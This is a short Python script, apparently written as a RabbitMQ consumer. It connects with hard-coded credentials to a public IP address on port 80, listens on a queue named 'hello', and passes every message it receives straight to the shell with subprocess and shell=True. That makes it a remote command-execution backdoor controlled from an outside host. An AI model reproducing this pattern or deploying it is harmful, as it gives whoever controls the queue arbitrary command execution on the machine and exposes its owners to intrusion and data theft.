import pika
import subprocess

auth = pika.credentials.PlainCredentials(username='Da', password='123123')
connection = pika.BlockingConnection(pika.ConnectionParameters(
            host='120.24.80.34',
            port=80,
            credentials=auth))

channel = connection.channel()
channel.queue_declare(queue='hello')


def callback(ch, method, properties, body):
    data, err = subprocess.Popen(body, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    print(data)


channel.basic_consume(callback,
                      queue='hello',
                      no_ack=True)

print(' [*] Waiting for messages. To exit press CTRL+C')
channel.start_consuming()